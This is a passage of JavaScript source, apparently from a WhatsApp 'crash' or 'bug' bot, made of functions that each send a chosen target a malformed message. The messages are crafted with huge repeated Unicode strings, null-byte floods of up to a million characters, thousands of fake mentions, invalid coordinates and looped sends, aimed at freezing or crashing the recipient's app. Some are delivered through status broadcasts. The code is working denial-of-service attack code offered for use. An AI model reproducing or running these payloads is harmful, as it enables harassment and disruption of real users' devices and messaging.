  await sock.relayMessage(target, fafi, fi);
}

async function ioz(sock, target) {
  await sock.relayMessage("status@broadcast", {
  "contactMessage": {
    "displayName": "🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣" + "𑇂𑆵𑆴𑆿".repeat(10000),
    "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nORG:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nTITLE:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🫀⃟⃰ᰧ𝐑𝐀𝐢͢𝐃𝐄𝐍 ▻ 𝐇𝐨𝐰 𝐃𝐨 𝐈 𝐆𝐞𝐭 𝐓𝐡𝐫𝐨𝐮𝐠𝐡 𝐓𝐡𝐢𝐬 ✩ >  🎩͜͡Ꮡ⃰⃟𝐓𝐡𝐫𝐞͢𝐞𝐬𝐢𝐱𝐭𝐲 ‣${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
  "contextInfo": {
     "participant": "status@broadcast",
        "externalAdReply": {
           "automatedGreetingMessageShown": true,
           "automatedGreetingMessageCtaType": "\u0000".repeat(100000),
           "greetingMessageBody": "\u0000"
        }
      }
    }
  }, {
    statusJidList: [target]
  })
}

async function DelayCarousel(sock, target) {
    try {
        const videoMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "r6rKspL7KzRZvoCBkbkAgNTbbZAz3EzCT7Jo7vivhW0=",
            fileLength: "10000000",
            mediaKey: "GHCUsF8us7byHgPCA8lVDELN67jra3I3lgRZXCCRc0s=",
            fileEncSha256: "VzWEuluQdKOio+HmwLAoi8/f4md4ppgsCoIocolbNRI=",
            directPath: "/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1767791229",
            streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
            thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
            thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
            thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
            annotations: [
                {
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "1942620729844671",
                            songId: "432395962368430",
                            author: "Yuukey Da",
                            title: "Уччкеу Дїшауи Жіьпарріп",
                            artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
                            artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
                            artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
                            artistAttribution: "",
                            countryBlocklist: "",
                            isExplicit: false,
                            artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
                        }
                    },
                    embeddedAction: true
                }
            ]
        };

        const msg = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            header: {
                                title: "\u0000",
                                hasMediaAttachment: true,
                                videoMessage
                            },
                            contextInfo: {
                                mentionedJid: [
                                    target,
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () =>
                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                    )
                                ],
                                remoteJid: " X "
                            },
                            carouselMessage: {
                                cards: Array.from({ length: 15 }, () => ({
                                    header: {
                                        title: "\u0000",
                                        hasMediaAttachment: true,
                                        videoMessage
                                    },
                                    contextInfo: {
                                        mentionedJid: [
                                            target,
                                            "0@s.whatsapp.net",
                                            ...Array.from({ length: 1900 }, () =>
                                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                                            )
                                        ],
                                        remoteJid: " X "
                                    },
                                    nativeFlowMessage: {
                                        messageParamsJson: "({".repeat(9000)
                                    }
                                }))
                            }
                        }
                    }
                }
            },
            {
                messageId: null,
                participant: {
                    jid: target
                }
            }
        );

        await sock.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: msg.message
                }
            },
            {
                messageId: msg.key.id,
                participant: { jid: target }
            }
        );

    } catch (e) {
       console.log(e.message)
    }
}

async function intVerify(sock, target) {
  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          title: " x ",
          body: {
            text: "Maklo" + "ꦽ".repeat(5000),
          },
          footer: {
            text: " dnd ;) "
          },
          contextInfo: {
            remoteJid: " dnd :) ",
            participant: "13135559098@s.whatsapp.net",
            mentionedJid: ["status@broadcast"],
            isForwarded: true,
            fromMe: false,
            forwardingScore: 9999,
            expiration: 7205,
            ephemeralSettingTimestamp: 2502
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "{}"
              },
              {
                name: "form_message",
                buttonParamsJson: "{}"
              },
              {
                name: "address_message",
                buttonParamsJson: "{}"
              }
            ],
            messageParamsJson: "",
            messageVersion: 3
          }
        }
      }
    }
  }, {})
  
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function crssh(sock, target) {
  const plenger = { requestPaymentMessage: {} }
  const final = { participant: { jid: target }, quoted: null, userJid: null }

  await sock.relayMessage(target, plenger, final)
}
    
async function plo(sock, target) {
  await sock.sendMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "> 😴"
            },
            footer: {
              text: " "
            },
            header: {
              hasMediaAttachment: false
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ោ៝".repeat(40000),
                    sections: [
                      {
                        title: "Menu",
                        rows: [
                          {
                            title: "Option 1",
                            id: "opt1"
                          }
                        ]
                      }
                    ]
                  })
                }
              ]
            }
          }
        }
      }
    }
  );
}
    
async function blanpk(sock, target) {
  await sock.sendMessage(
    target,
    {
      interactiveMessage: {
        body: {
          text: "> 😴"
        },
        footer: {
          text: "XxS"
        },
        header: {
          hasMediaAttachment: false
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(40000),
                sections: [
                  {
                    title: "xxx",
                    rows: [
                      {
                        title: "xXs",
                        id: "xxx"
                      }
                    ]
                  }
                ]
              })
            }
          ]
        }
      }
    }
  );
}
    
async function blpank(sock, target) {
  await sock.sendMessage(
    target,
    {
      interactiveMessage: {
        title: "> 😴",
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ោ៝".repeat(40000)
            })
          }
        ]
      }
    },
    { participant: { jid: target } }
  );
}
    
async function blanokmhk(sock, target) {
  const options = [{ optionName: "s9ck" }, { optionName: "sock" }, { optionName: "sockx" }];
  const correctAnswer = options[1];

  const pollMsg = generateWAMessageFromContent(
    target,
    {
      botInvokeMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            messageAssociation: { associationType: 7, parentMessageKey: crypto.randomBytes(16) }
          },
          pollCreationMessage: {
            name: "sock Here",
            options,
            selectableOptionsCount: 1,
            pollType: "QUIZ",
            correctAnswer
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, pollMsg.message, {
    participant: { jid: target },
    messageId: pollMsg.key.id
  });

  const nativeMsg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "sock Here Broh", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            },
            quotedMessage: {
              sendPaymentMessage: {
                noteMessage: null,
                requestMessageKey: undefined,
                background: null
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, nativeMsg.message, {
    participant: { jid: target },
    messageId: nativeMsg.key.id
  });
}
    
async function blaplouunk(sock, target) {
  await sock.relayMessage(target, {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: " XxS ",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.9999999999999,
              name: " XxS ",
              address: "X",
              jpegThumbnail: Buffer.from(
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAECAwUGAQADAQEAAAAAAAAAAAAAAAAAAQMCBP/aAAwDAQACEAMQAAAA6iK052qv1Jy+R0dVGejPNFJuwypOjdJZNqpvYJpEFIN600nvWlx6lZlU0ialOdtnK86sYN5hktvdnIHRYvcDTEgy2QAsAl//xAAkEAACAgICAgICAwAAAAAAAAABAgADETEEIRIiEBM0YQUyUf/aAAgBAQABPwBuZSh3L+e79VR0dvZjmEfqey9zjfyVlXT9iUciu9coYqgljAF3APKFVA/rAldg7XEsrrBIAlNrce9COgYoKMUh2QJWMACW0ee4qGsAQ1eRIyRLVxdTnWZy8B8jcrBcxHxA4Ilrd/oRyMhhLz9lqINkwkuCTsysYhUKhMUnEwuyRLcf6JR+bXEEB8GhYOpEVfXBn1gDIWW6PrOH+YrHUURDoERqEI6GIQ1Z71PsXG5aylTPAhIPhWyBLATDxwOzFrTHaiXrFx8AwHuMQYTiXEET/8QAGhEAAgMBAQAAAAAAAAAAAAAAAAECICEQEf/aAAgBAgEBPwBts8FgtHj7GkaOv//EABsRAAMAAwEBAAAAAAAAAAAAAAABEQIQICEx/9oACAEDAQE/AIQeOrUhDSMvr0jycUnP/9k=",
                  "base64"
                ),
            },
            hasMediaAttachment: true
          },
          body: {
            text: ""
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "address_message",
                buttonParamsJson: "[".repeat(5000)
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "{".repeat(38888)
              }
            ],
            messageParamsJson: "Wa.me/stickerpack/xxs",
            messageVersion: 1
          }
        }
      }
    }
  }, { participant: { jid: target }})
}
    
async function blank(sock, target) {
  const mentionedJid = [
    "131338822@s.whatsapp.net",
    ...Array.from({ length: 1900 }, () =>
      `1${Math.floor(Math.random() * 5_000_000)}@s.whatsapp.net`
    ),
  ];

  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",

        name: `maklo⃝҉⃝${"ꦾ".repeat(40_000)}`,
        publisher: "ꦽ".repeat(20_000),
        stickers: [],

        fileLength: 12260,
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",

        directPath:
          "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",

        height: 9999,
        width: 9999,

        mediaKeyTimestamp: "1747502082",

        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,

        emojis: ["🤤", "👄", "💦", "🥵"],

        contextInfo: {
          mentionedJid,
          remoteJid: "X",
          participant: target,
          stanzaId: "1234567890ABCDEF",

          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1_814_400_000,
            },
          },
        },

        packDescription: "",
        trayIconFileName:
          "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",

        thumbnailDirectPath:
          "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",

        thumbnailSha256:
          "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256:
          "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,

        imageDataHash:
          "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",

        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
      },
    },
    {
      participant: { jid: target },
    }
  );
}
    
   
async function blapoymnk(sock, target) {
 await sock.relayMessage(target, {
   locationMessage: {
    degreesLatitude: -9999999,
    degreesLongitude: 6666666,
    name: "XxS",
    address: "xxs"
   }
  },
  {
   participant: { jid: target }
  });
}
    
async function CrashClick(sock, target) {
  let My = Date.now();
  while (Date.now() - My < 250) {
  try {
  await sock.relayMessage(target, {
    viewOnceMessageV2: {
      message: {
        locationMessage: {
          name: "- My Function",
          degreesLatitude: 9999,
          degreesLongitude: -9999,
          address: "- My Function",
        }
      }
    }
  }, { messageId: sock.generateMessageTag() });
    await new Promise(r => setTimeout(r, 1500));
    } catch (e) {}
  }
}
    
async function gsGlx(sock, target, Ptcp = true) {
  for (let i = 0; i < 10; i++) {
    let msg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, y) => `6285983729${y + 1}@s.whatsapp.net`
            )
          },
          body: {
            text: "AVG 7",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{"flow_cta":"${"\u0000".repeat(900000)}"}`,
            version: 3
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      Ptcp
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );
  }
}
    
async function InTransitBusiness(sock, target) {
    const orderMsg = {
        orderMessage: {
            orderId: "4U7S4RWPS3C",
            itemCount: 99999999,
            status: "IN_TRANSIT",
            surface: 2,
            sellerJid: "x", 
            totalAmount1000: 5000000000000000,
            currencyCodeIso4217: "IDR",
            contextInfo: {
                stanzaId: "3EB0F1A2B3C4D5E6",
                participant: target,
                mentionedJid: Array.from(
  { length: 2000 },
  (_, y) => `6785983729${y + 1}@s.whatsapp.net`
)
            }
        }
    };

    await sock.relayMessage(target, orderMsg, { 
        participant: { jid: target },
        messageId: null
    });
}
    
async function sticker9ack(sock, target) {
  let message = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: crypto.randomUUID()
    },
    message: {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "ꦽ".repeat(45000),
        publisher: "El Kontole",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: target,
          participant: "0@s.whatsapp.net",
          stanzaId: "from_null",
          mentionedJid: [
            "999999999999@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
          ]
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });
}
// new func
async function MarkNyawit(sock, target) {
  try {
    const S = {
      viewOnceMessage: {
        message: {
          newsletterAdminInviteMessage: {
             newsletterJid: "123456789@newsletter",
             inviteCode: "𑜦𑜠".repeat(120000),
             inviteExpiration: 99999999999,
             newsletterName: "ោ៝" + "ꦾ".repeat(250000),
             body: {
                 text: "I AM Sanzy" + "ી".repeat(250000)
                }
             }
          }
       }
    };

    await sock.relayMessage(target, S, { participant: { jid: target } });
  } catch (e) {
    console.log("❌ Error Bng:", e.message || e);
  }
}
async function AhhCrot(sock, target) {
